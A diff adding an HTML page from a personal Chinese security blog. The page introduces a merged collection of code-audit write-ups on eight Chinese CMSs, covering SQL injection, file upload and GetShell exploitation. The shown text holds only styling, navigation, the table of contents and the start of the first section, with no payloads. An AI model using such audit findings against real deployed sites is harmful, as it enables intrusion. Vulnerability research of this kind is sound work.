@@ -1,0 +1,1533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CMS 代码审计实战合集（八个国产 CMS） · 艾恩葛朗特第一层の旅店</title>
+<link rel="icon" href="/favicon.ico">
+<style>
+.topbar{position:fixed;top:0;left:0;right:0;z-index:60;padding:14px 20px}
+.topbar-in{max-width:1120px;margin:0 auto;height:56px;padding:0 8px 0 18px;display:flex;align-items:center;justify-content:space-between;gap:18px;border-radius:999px;border:1px solid rgba(255,255,255,.22);background:rgba(78,86,120,.42);backdrop-filter:blur(18px) saturate(160%);-webkit-backdrop-filter:blur(18px) saturate(160%);box-shadow:0 12px 34px rgba(6,18,34,.32)}
+.brand{display:flex;align-items:center;gap:9px;text-decoration:none;white-space:nowrap;color:#fff}
+.brand .mark{width:28px;height:28px;flex:none;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;background:linear-gradient(140deg,#3aa3e3,#62a33d);font:700 15px/1 Georgia,"Times New Roman",serif;color:#fff}
+.brand .word{font:700 17px/1 Georgia,"Times New Roman",serif}
+.nav-menu{display:flex;align-items:center;gap:24px;list-style:none;margin:0;padding:0}
+.nav-menu a{position:relative;color:rgba(255,255,255,.88);text-decoration:none;font-size:14.5px;white-space:nowrap;transition:color .25s ease}
+.nav-menu a::after{content:"";position:absolute;left:50%;bottom:-6px;width:0;height:2px;border-radius:2px;background:#fff;transform:translateX(-50%);transition:width .3s cubic-bezier(.4,0,.2,1)}
+.nav-menu a:hover{color:#fff}
+.nav-menu a:hover::after{width:60%}
+.topbar .avatar-btn{width:34px;height:34px;border-radius:50%;overflow:hidden;flex:none;border:2px solid rgba(255,255,255,.85);box-shadow:0 4px 14px rgba(6,20,36,.4)}
+.topbar .avatar-btn img{width:100%;height:100%;object-fit:cover;display:block}
+@media(max-width:820px){.topbar{padding:10px 12px}.topbar-in{padding:0 6px 0 12px}.brand .word{font-size:15px}.nav-menu{gap:12px}.nav-menu a{font-size:13px}.nav-menu a::after{display:none}}
+:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+/* 文章页：左栏 + 正文两栏 */
+.layout{max-width:1180px;margin:0 auto;padding:96px 20px 90px;display:flex;gap:22px;align-items:flex-start}
+.main{flex:1 1 auto;min-width:0}
+.crumb{
+  display:inline-flex;align-items:center;gap:7px;margin-bottom:14px;padding:6px 15px;border-radius:999px;
+  font-size:13px;color:#fff;text-decoration:none;
+  background:rgba(226,236,248,.16);border:1px solid var(--line);backdrop-filter:blur(12px);transition:.3s;
+}
+.crumb:hover{background:rgba(58,163,227,.5)}
+
+/* 左栏（与首页同款） */
+.side{flex:0 0 250px;width:250px;position:sticky;top:96px;max-height:calc(100vh - 108px);overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none}
+.side::-webkit-scrollbar{width:0;height:0;display:none}
+.side .card{
+  background:rgba(12,28,48,.44);border:1px solid var(--line);border-radius:18px;margin-bottom:16px;padding:18px 16px;
+  box-shadow:0 14px 34px rgba(6,20,36,.28);backdrop-filter:blur(16px) saturate(140%);
+  -webkit-backdrop-filter:blur(16px) saturate(140%);
+}
+.side .profile{text-align:center;padding:20px 16px 16px}
+.side .profile .avatar{width:96px;height:96px;margin:0 auto;border-radius:50%;overflow:hidden;box-shadow:0 10px 26px rgba(6,20,36,.4)}
+.side .profile .avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.side .profile .name{position:relative;display:inline-block;margin:11px auto 3px;padding-bottom:5px;font-size:16px;font-weight:700;color:#fff}
+.side .profile .name::after{content:"";position:absolute;left:50%;bottom:0;width:0;height:2px;background:var(--sky);transform:translateX(-50%);transition:width .3s ease}
+.side .profile .name:hover::after{width:52%}
+.side .profile .bio{margin:5px 0 0;font-size:12.5px;color:var(--muted)}
+.side .profile .socials{display:flex;justify-content:center;gap:9px;margin-top:13px}
+.side .profile .socials a{
+  width:36px;height:36px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;
+  background:rgba(255,255,255,.12);border:1px solid var(--line);color:#fff;text-decoration:none;
+  transition:all .3s cubic-bezier(.075,.82,.165,1);
+}
+.side .profile .socials a:hover{background:rgba(58,163,227,.5);transform:translateY(-3px)}
+.side .sec-title{position:relative;display:flex;align-items:center;margin:0 0 11px;padding-left:11px;font-size:14.5px;font-weight:600;color:#fff}
+.side .sec-title::before{content:"";position:absolute;left:0;top:50%;width:3px;height:54%;border-radius:2px;background:var(--sky);transform:translateY(-50%);transition:height .3s ease-in-out}
+.side .card:hover .sec-title::before{height:86%}
+.side .sec-title .sub{margin-left:auto;font-size:11.5px;font-weight:400;color:var(--muted)}
+.side .sec-title.center{justify-content:center;padding-left:0}
+.side .sec-title.center::before{display:none}
+.side .sec-title.center .sub{margin-left:8px}
+.side .tabs{display:flex;align-items:center;border-bottom:1px solid var(--line);padding-bottom:9px;margin-bottom:11px}
+.side .tab{position:relative;flex:1 1 0;height:30px;border:0;background:none;color:rgba(255,255,255,.6);font-size:13.5px;cursor:pointer;transition:color .3s ease}
+.side .tab+.tab::before{content:"";position:absolute;left:0;top:50%;width:1px;height:14px;background:var(--line);transform:translateY(-50%)}
+.side .tab:hover{color:#fff}
+.side .tab.on{color:#fff}
+.side .tab.on::after{content:"";position:absolute;left:50%;bottom:-10px;width:6px;height:6px;border-radius:50%;background:var(--sky);box-shadow:0 0 9px rgba(58,163,227,.9);transform:translateX(-50%)}
+.side .list{display:flex;flex-direction:column;gap:7px;max-height:300px;overflow-y:auto;scrollbar-width:none;-ms-overflow-style:none}
+.side .list::-webkit-scrollbar{width:0;height:0;display:none}
+.side .list a{display:flex;align-items:center;gap:9px;text-decoration:none;opacity:.9;transition:opacity .3s ease,transform .3s ease}
+.side .list a:hover{opacity:1;transform:translateX(2px)}
+.side .list a.cur .t{color:#bfe4ff}
+.side .thumb{flex:none;width:32px;height:32px;border-radius:50%;overflow:hidden;border:1px solid rgba(255,255,255,.3);background:linear-gradient(135deg,rgba(58,163,227,.55),rgba(98,163,61,.55))}
+.side .thumb img{width:100%;height:100%;object-fit:cover;display:block}
+.side .txt{min-width:0;flex:1 1 auto}
+.side .t{display:block;font-size:12.5px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.5}
+.side .m{display:block;font-size:11px;color:var(--muted);margin-top:1px}
+.side .empty{padding:14px 4px;text-align:center;font-size:12.5px;color:var(--muted)}
+.side .cat{list-style:none;margin:0;padding:0}
+.side .cat .row{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:6px 6px;border-radius:9px;color:rgba(255,255,255,.9);font-size:13px;text-decoration:none;transition:background .3s ease,transform .3s ease;cursor:pointer}
+.side .cat .row:hover{background:rgba(255,255,255,.12);transform:translateX(2px)}
+.side .cat .n{flex:none;min-width:24px;padding:1px 7px;border-radius:999px;background:rgba(255,255,255,.15);border:1px solid var(--line);font-size:11px;text-align:center;color:#fff}
+.side .cloud{display:flex;flex-wrap:wrap;gap:7px}
+.side .cloud .tagpill{display:inline-block;padding:3px 10px;border-radius:999px;background:rgba(255,255,255,.13);border:1px solid var(--line);font-size:11.5px;color:rgba(255,255,255,.9);text-decoration:none;transition:all .3s ease;cursor:pointer}
+
+/* 封面大图 + 白色毛玻璃信息层 */
+.hero{
+  position:relative;height:300px;border-radius:20px;overflow:hidden;margin-bottom:18px;
+  border:1px solid rgba(255,255,255,.28);background:linear-gradient(135deg,rgba(58,163,227,.5),rgba(98,163,61,.5));
+  box-shadow:0 18px 44px rgba(6,20,36,.34);
+}
+.hero-bg{
+  position:absolute;inset:0;display:block;
+  background-image:var(--hero);background-size:cover;background-position:center;
+  transform:scale(1.02);
+}
+.hero:hover .hero-bg{transform:scale(1.05);transition:transform 1.2s cubic-bezier(.22,.61,.36,1)}
+.hero-glass{
+  position:absolute;inset:0;z-index:2;
+  display:flex;flex-direction:column;justify-content:center;gap:12px;
+  padding:26px 30px;
+  /* 暗色毛玻璃：左侧更实保证文字可读，右侧更透让插画透出来 */
+  background:linear-gradient(to right,rgba(6,18,34,.82) 0%,rgba(6,18,34,.6) 46%,rgba(6,18,34,.24) 100%);
+  backdrop-filter:blur(5px) saturate(140%);
+  -webkit-backdrop-filter:blur(5px) saturate(140%);
+  color:#eaf3ff;
+}
+.hero-title{
+  margin:0;font-size:27px;line-height:1.4;font-weight:700;color:#fff;
+  text-shadow:0 2px 14px rgba(4,12,24,.7);
+  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
+}
+.hero-meta{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:6px;font-size:13.5px;color:rgba(234,243,255,.82)}
+.hero-meta li{display:flex;align-items:center;gap:8px}
+.hero-meta svg{width:15px;height:15px;flex:none;opacity:.8}
+.hero-meta b{font-weight:600;color:#fff}
+.hero-share{display:flex;gap:11px;margin-top:8px}
+.hero-share a,.hero-share button{
+  width:40px;height:40px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;
+  background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.34);
+  color:#eaf3ff;backdrop-filter:blur(8px);
+  box-shadow:0 4px 14px rgba(4,12,24,.3);
+  transition:transform .3s ease,background .3s ease,color .3s ease;
+}
+.hero-share a:hover,.hero-share button:hover{transform:translateY(-3px);background:rgba(58,163,227,.55);color:#fff}
+
+/* 正文面板：白色毛玻璃 */
+.panel{
+  background:rgba(10,24,42,.62);
+  border:1px solid rgba(255,255,255,.16);border-radius:20px;padding:30px 34px 34px;
+  backdrop-filter:blur(18px) saturate(150%);-webkit-backdrop-filter:blur(18px) saturate(150%);
+  box-shadow:0 18px 44px rgba(4,12,24,.34);
+  color:rgba(234,243,255,.9);
+}
+.panel-title{
+  margin:0 0 14px;padding-left:13px;font-size:26px;line-height:1.4;color:#fff;
+  border-left:4px solid var(--sky);
+}
+.panel .meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px;padding-bottom:16px;border-bottom:1px dashed rgba(255,255,255,.18)}
+.panel .chip{padding:2px 11px;border-radius:999px;background:rgba(58,163,227,.2);border:1px solid rgba(58,163,227,.36);font-size:12px;color:#bfe0ff}
+.panel .chip.date{color:#f0d79a;background:rgba(224,165,69,.18);border-color:rgba(224,165,69,.36)}
+
+/* 正文排版（暗色玻璃底） */
+.sao-article h1,.sao-article h2,.sao-article h3,.sao-article h4,.sao-article h5,.sao-article h6{color:#fff;font-weight:700;line-height:1.45;margin:1.6em 0 .6em}
+.sao-article h2{font-size:22px;border-left:3px solid var(--sky);padding-left:12px}
+.sao-article h3{font-size:19px;color:#dcecff}
+.sao-article p{margin:.9em 0}
+.sao-article a{color:#8fd0ff;text-decoration:underline;text-underline-offset:3px}
+.sao-article a:hover{color:#fff}
+.sao-article img{max-width:100%;height:auto;border-radius:10px;margin:14px 0}
+.sao-article ul,.sao-article ol{padding-left:1.5em;margin:.9em 0}
+.sao-article li{margin:.35em 0}
+.sao-article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:rgba(234,243,255,.82)}
+.sao-article code{background:rgba(255,255,255,.12);color:#ffd9a8;padding:2px 6px;border-radius:5px;font-size:.9em;font-family:Consolas,Monaco,monospace}
+.sao-article pre{background:rgba(4,12,24,.72);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+.sao-article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+.sao-article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+.sao-article th,.sao-article td{border:1px solid rgba(255,255,255,.18);padding:8px 12px;text-align:left}
+.sao-article th{background:rgba(255,255,255,.08);color:#fff}
+.sao-article hr{border:none;border-top:1px dashed rgba(255,255,255,.2);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed rgba(255,255,255,.24);border-radius:10px;background:rgba(255,255,255,.05);color:rgba(234,243,255,.7);font-size:13px;text-align:center}
+
+@media(max-width:1080px){
+  .layout{flex-direction:column;padding-top:88px}
+  .side{
+    position:static;width:100%;flex:none;max-height:none;display:grid;
+    grid-template-columns:repeat(2,minmax(0,1fr));gap:16px;align-items:start;
+  }
+  .side .card{margin-bottom:0}
+  .side .profile{grid-column:1/-1}
+}
+@media(max-width:820px){
+  .side{grid-template-columns:minmax(0,1fr)}
+  .hero{height:250px}
+  .hero-glass{padding:20px 22px;background:linear-gradient(to right,rgba(6,18,34,.86),rgba(6,18,34,.62))}
+  .hero-title{font-size:21px}
+  .panel{padding:22px 18px 24px}
+  .panel-title{font-size:21px}
+}
+
+/* 页脚 */
+.site-footer{position:relative;z-index:1;padding:22px 16px 30px;text-align:center;font-size:12.5px;color:rgba(233,242,253,.62);letter-spacing:.05em}
+.site-footer b{color:#7cc4ec;font-weight:600;font-variant-numeric:tabular-nums;font-size:13.5px}
+.site-footer .star{margin:0 10px;color:rgba(233,242,253,.35)}
+
+/* 悬浮音乐播放器（左下角） */
+.mp-root{position:fixed;left:18px;bottom:18px;z-index:80}
+.mp-disc{
+  width:52px;height:52px;border-radius:50%;cursor:pointer;padding:0;position:relative;
+  border:2px solid rgba(255,255,255,.5);
+  background:radial-gradient(circle,#0d2137 0 20%,#16283f 21% 36%,#0d2137 37% 54%,#16283f 55% 70%,#0d2137 71% 100%);
+  box-shadow:0 10px 26px rgba(4,12,24,.55);
+  animation:mp-spin 7s linear infinite;animation-play-state:paused;
+  transition:transform .3s ease,box-shadow .3s ease;
+}
+.mp-disc:hover{transform:scale(1.06);box-shadow:0 14px 32px rgba(4,12,24,.65)}
+.mp-disc.playing{animation-play-state:running}
+.mp-disc::before{content:'';position:absolute;left:50%;top:7px;bottom:7px;width:2px;margin-left:-1px;background:linear-gradient(rgba(255,255,255,.4),rgba(255,255,255,.06))}
+.mp-disc::after{content:'';position:absolute;inset:0;margin:auto;width:15px;height:15px;border-radius:50%;background:linear-gradient(140deg,#3aa3e3,#62a33d);border:2px solid rgba(255,255,255,.75)}
+@keyframes mp-spin{to{transform:rotate(360deg)}}
+.mp-panel{
+  position:absolute;left:0;bottom:64px;width:302px;max-width:calc(100vw - 32px);
+  border-radius:16px;background:rgba(10,24,42,.86);border:1px solid rgba(255,255,255,.2);
+  backdrop-filter:blur(18px) saturate(150%);-webkit-backdrop-filter:blur(18px) saturate(150%);
+  box-shadow:0 18px 44px rgba(4,12,24,.55);padding:14px 14px 8px;color:#eaf3ff;
+  opacity:0;transform:translateY(8px);pointer-events:none;
+  transition:opacity .3s ease,transform .3s ease;
+}
+.mp-panel.open{opacity:1;transform:none;pointer-events:auto}
+.mp-head{display:flex;align-items:baseline;gap:8px;min-width:0}
+.mp-title{font-weight:600;font-size:13.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.mp-artist{font-size:11px;color:rgba(233,242,253,.55);margin-left:auto;flex:none;white-space:nowrap}
+.mp-progress{display:flex;align-items:center;gap:8px;margin-top:10px}
+.mp-bar{flex:1;height:4px;border-radius:2px;background:rgba(255,255,255,.18);cursor:pointer;position:relative}
+.mp-bar i{position:absolute;left:0;top:0;bottom:0;width:0;border-radius:2px;background:linear-gradient(90deg,#3aa3e3,#7cc4ec)}
+.mp-time{font-size:10.5px;color:rgba(233,242,253,.6);font-variant-numeric:tabular-nums;flex:none}
+.mp-ctrls{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:10px}
+.mp-ctrls button{
+  width:32px;height:32px;border-radius:50%;border:1px solid rgba(255,255,255,.2);
+  background:rgba(255,255,255,.08);color:#fff;cursor:pointer;
+  display:inline-flex;align-items:center;justify-content:center;
+  transition:background .25s ease,transform .25s ease;
+}
+.mp-ctrls button:hover{background:rgba(58,163,227,.5);transform:scale(1.06)}
+.mp-ctrls button svg{width:14px;height:14px}
+.mp-ctrls .mp-playbtn{width:40px;height:40px;background:linear-gradient(140deg,#3aa3e3,#62a33d);border-color:transparent}
+.mp-playlist{list-style:none;margin:10px 0 2px;padding:5px 2px 3px;border-top:1px dashed rgba(255,255,255,.16);max-height:148px;overflow-y:auto}
+.mp-playlist li{padding:6px 9px;border-radius:8px;font-size:12.5px;color:rgba(233,242,253,.85);cursor:pointer;display:flex;gap:8px;align-items:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.mp-playlist li:hover{background:rgba(255,255,255,.08)}
+.mp-playlist li.on{color:#fff;background:rgba(58,163,227,.28)}
+.mp-playlist li .idx{font-size:10.5px;color:rgba(233,242,253,.5);flex:none;width:14px}
+@media(max-width:640px){
+  .mp-root{left:12px;bottom:12px}
+  .mp-disc{width:46px;height:46px}
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="brand" href="/"><span class="mark">剑</span><span class="word">艾恩葛朗特第一层の旅店</span></a>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="/">首页</a></li>
+        <li><a href="/diary/">随心记</a></li>
+        <li><a href="/wallpaper/">壁纸墙</a></li>
+        <li><a href="/link/">友人帐</a></li>
+        <li><a href="/about/">关于我</a></li>
+      </ul>
+    </nav>
+    <a class="avatar-btn" href="/about/" title="vernus"><img src="/icons/cards/avatar.png" alt="vernus"></a>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="side">
+  <section class="card profile">
+    <div class="avatar"><img src="/icons/cards/avatar.png" alt="vernus"></div>
+    <div class="name">艾恩葛朗特第一层の旅店</div>
+    <p class="bio">愿终有一天能与你重要的人重逢</p>
+    <div class="socials">
+      <a href="https://github.com/vernuser" target="_blank" rel="noopener" title="GitHub" aria-label="GitHub">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor"><path d="M12 .5C5.7.5.5 5.7.5 12c0 5.1 3.3 9.4 7.9 10.9.6.1.8-.3.8-.6v-2c-3.2.7-3.9-1.5-3.9-1.5-.5-1.3-1.3-1.7-1.3-1.7-1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1 1.8 2.7 1.3 3.4 1 .1-.8.4-1.3.7-1.6-2.6-.3-5.3-1.3-5.3-5.8 0-1.3.5-2.3 1.2-3.2-.1-.3-.5-1.5.1-3 0 0 1-.3 3.3 1.2a11 11 0 0 1 6 0C17.7 4.7 18.7 5 18.7 5c.6 1.5.2 2.7.1 3 .8.9 1.2 1.9 1.2 3.2 0 4.5-2.7 5.5-5.3 5.8.4.4.8 1.1.8 2.2v3.3c0 .3.2.7.8.6 4.6-1.5 7.9-5.8 7.9-10.9C23.5 5.7 18.3.5 12 .5z"/></svg>
+      </a>
+      <a href="https://space.bilibili.com/348470293" target="_blank" rel="noopener" title="BiliBili" aria-label="BiliBili">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor"><path d="M17.8 4.6h2.7c1 0 1.8.8 1.8 1.8v10.4c0 1-.8 1.8-1.8 1.8H3.5c-1 0-1.8-.8-1.8-1.8V6.4c0-1 .8-1.8 1.8-1.8h2.7L4.9 3.3c-.3-.3-.3-.7 0-1 .3-.3.7-.3 1 0l2.4 2.3h7.4l2.4-2.3c.3-.3.7-.3 1 0 .3.3.3.7 0 1l-1.3 1.3zM7.2 10.6c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1zm9.6 0c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1z"/></svg>
+      </a>
+      <a href="mailto:vernuser@foxmail.com" title="邮箱" aria-label="邮箱">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="2.5" y="4.5" width="19" height="15" rx="2.5"/><path d="m3 6.5 9 6.5 9-6.5"/></svg>
+      </a>
+      <a href="http://wpa.qq.com/msgrd?v=3&uin=840683056&site=qq&menu=yes" target="_blank" rel="noopener" title="QQ" aria-label="QQ">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor"><path d="M12 2c3 0 5.2 2.3 5.2 5.4 0 1 .3 1.6.9 2.6.9 1.5 1.9 3 1.9 5.1 0 1.4-.5 2.3-1.3 2.3-.6 0-1.1-.5-1.5-1.3-.8 1.4-2.2 2.4-3.9 2.4h-2.6c-1.7 0-3.1-1-3.9-2.4-.4.8-.9 1.3-1.5 1.3-.8 0-1.3-.9-1.3-2.3 0-2.1 1-3.6 1.9-5.1.6-1 .9-1.6.9-2.6C6.8 4.3 9 2 12 2z"/></svg>
+      </a>
+    </div>
+  </section>
+
+  <section class="card">
+    <h3 class="sec-title center">最近<span class="sub">5 篇</span></h3>
+    <div class="list" id="list"></div>
+  </section>
+
+  <section class="card">
+    <h3 class="sec-title">分类<span class="sub">26 个</span></h3>
+    <ul class="cat"><li><a class="row" href="/#cat=%E9%9D%B6%E5%9C%BA"><span>靶场</span><span class="n">11</span></a></li><li><a class="row" href="/#cat=%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span>代码审计</span><span class="n">5</span></a></li><li><a class="row" href="/#cat=%E6%B8%97%E9%80%8F"><span>渗透</span><span class="n">4</span></a></li><li><a class="row" href="/#cat=%E6%9C%AA%E5%88%86%E7%B1%BB"><span>未分类</span><span class="n">4</span></a></li><li><a class="row" href="/#cat=ai"><span>ai</span><span class="n">3</span></a></li><li><a class="row" href="/#cat=%E5%B7%A5%E5%85%B7"><span>工具</span><span class="n">2</span></a></li><li><a class="row" href="/#cat=%E5%86%85%E7%BD%91"><span>内网</span><span class="n">2</span></a></li><li><a class="row" href="/#cat=web"><span>web</span><span class="n">2</span></a></li><li><a class="row" href="/#cat=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span>操作系统</span><span class="n">1</span></a></li><li><a class="row" href="/#cat=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C"><span>计算机网络</span><span class="n">1</span></a></li></ul>
+  </section>
+
+  <section class="card">
+    <h3 class="sec-title">标签云<span class="sub">24 个</span></h3>
+    <div class="cloud"><a class="tagpill" href="/#tag=%E9%9D%B6%E5%9C%BA">靶场</a><a class="tagpill" href="/#tag=%E6%B8%97%E9%80%8F">渗透</a><a class="tagpill" href="/#tag=web">web</a><a class="tagpill" href="/#tag=%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a><a class="tagpill" href="/#tag=ai">ai</a><a class="tagpill" href="/#tag=%E5%86%85%E7%BD%91">内网</a><a class="tagpill" href="/#tag=%E5%B7%A5%E5%85%B7">工具</a><a class="tagpill" href="/#tag=vpn">vpn</a><a class="tagpill" href="/#tag=markdown">markdown</a><a class="tagpill" href="/#tag=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94">应急响应</a><a class="tagpill" href="/#tag=%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B">入侵检测</a><a class="tagpill" href="/#tag=owasp">owasp</a><a class="tagpill" href="/#tag=openvas">openvas</a><a class="tagpill" href="/#tag=%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8">小迪安全</a><a class="tagpill" href="/#tag=yaml">yaml</a><a class="tagpill" href="/#tag=ctf">ctf</a><a class="tagpill" href="/#tag=%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81">内存取证</a><a class="tagpill" href="/#tag=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">计算机网络</a><a class="tagpill" href="/#tag=php">php</a><a class="tagpill" href="/#tag=python">python</a><a class="tagpill" href="/#tag=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a><a class="tagpill" href="/#tag=%E6%89%8B%E6%B3%95">手法</a><a class="tagpill" href="/#tag=%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">数据结构</a><a class="tagpill" href="/#tag=%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">原型链污染</a></div>
+  </section>
+</aside>
+
+  <main class="main">
+    <a class="crumb" href="/">← 返回首页</a>
+
+    <section class="hero" style="--hero:url('/covers/0070.jpg')">
+      <span class="hero-bg"></span>
+      <div class="hero-glass">
+        <h1 class="hero-title">CMS 代码审计实战合集（八个国产 CMS）</h1>
+        <ul class="hero-meta">
+          <li>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"><circle cx="12" cy="12" r="8.6"/><path d="M12 7.6V12l3 1.8"/></svg>
+            <span>发表于 <b>2024-11-08</b></span>
+          </li>
+          <li>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M2.6 12S6 5.4 12 5.4 21.4 12 21.4 12 18 18.6 12 18.6 2.6 12 2.6 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+            <span>字数 <b>22,226</b> · 约 <b>56</b> 分钟</span>
+          </li>
+          <li>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.4 8.4 0 0 1-8.5 8.4 9 9 0 0 1-3.8-.8L3 21l1.9-5.4a8.2 8.2 0 0 1-.9-3.7A8.4 8.4 0 0 1 12.5 3 8.4 8.4 0 0 1 21 11.5z"/></svg>
+            <span>评论 <b>—</b></span>
+          </li>
+        </ul>
+        <div class="hero-share">
+          <a href="https://github.com/vernuser" target="_blank" rel="noopener" title="GitHub" aria-label="GitHub">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 .5C5.7.5.5 5.7.5 12c0 5.1 3.3 9.4 7.9 10.9.6.1.8-.3.8-.6v-2c-3.2.7-3.9-1.5-3.9-1.5-.5-1.3-1.3-1.7-1.3-1.7-1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1 1.8 2.7 1.3 3.4 1 .1-.8.4-1.3.7-1.6-2.6-.3-5.3-1.3-5.3-5.8 0-1.3.5-2.3 1.2-3.2-.1-.3-.5-1.5.1-3 0 0 1-.3 3.3 1.2a11 11 0 0 1 6 0C17.7 4.7 18.7 5 18.7 5c.6 1.5.2 2.7.1 3 .8.9 1.2 1.9 1.2 3.2 0 4.5-2.7 5.5-5.3 5.8.4.4.8 1.1.8 2.2v3.3c0 .3.2.7.8.6 4.6-1.5 7.9-5.8 7.9-10.9C23.5 5.7 18.3.5 12 .5z"/></svg>
+          </a>
+          <a href="https://space.bilibili.com/348470293" target="_blank" rel="noopener" title="BiliBili" aria-label="BiliBili">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M17.8 4.6h2.7c1 0 1.8.8 1.8 1.8v10.4c0 1-.8 1.8-1.8 1.8H3.5c-1 0-1.8-.8-1.8-1.8V6.4c0-1 .8-1.8 1.8-1.8h2.7L4.9 3.3c-.3-.3-.3-.7 0-1 .3-.3.7-.3 1 0l2.4 2.3h7.4l2.4-2.3c.3-.3.7-.3 1 0 .3.3.3.7 0 1l-1.3 1.3zM7.2 10.6c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1zm9.6 0c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1z"/></svg>
+          </a>
+          <button type="button" class="share-copy" data-url="" title="复制链接">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="11" height="11" rx="2.4"/><path d="M6 15H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v1"/></svg>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <article class="panel sao-article">
+      <h1 class="panel-title">CMS 代码审计实战合集（八个国产 CMS）</h1>
+      <div class="meta"><span class="chip date">2024-11-08</span><span class="chip">分类·代码审计</span><span class="chip">#代码审计</span></div>
+      <p>八个国产 CMS 的代码审计实战记录——五指、BossCMS、IBOS、KiteCMS、ZZCMS、YzmCMS、海 CMS、信呼，覆盖 SQL 注入、任意文件上传与 GetShell 等漏洞的分析与利用过程。</p>
+<blockquote>
+<p>本篇由 8 篇内容相近的笔记合并整理，<strong>安排如下</strong>（按时间顺序）：</p>
+</blockquote>
+<ol>
+<li><strong>五指cms代码审计</strong>（2024年9月31日）</li>
+<li><strong>bosscms代码审计</strong>（2024年10月5日）</li>
+<li><strong>IBOScms代码审计</strong>（2024年10月7日）</li>
+<li><strong>kitecms代码审计</strong>（2024年10月11日）</li>
+<li><strong>zzcms代码审计</strong>（2024年10月13日）</li>
+<li><strong>yzmcms代码审计</strong>（2024年10月21日）</li>
+<li><strong>hadcms代码审计</strong>（2024年10月26日）</li>
+<li><strong>xinhucms代码审计</strong>（2024年11月8日）</li>
+</ol>
+<hr>
+<h1>1. 五指cms代码审计（2024年9月31日）</h1>
+<p>在根目录index.php中看到</p>
+<p><img src="https://pic.imgdb.cn/item/66f8e54ef21886ccc044b327.png" alt=""></p>
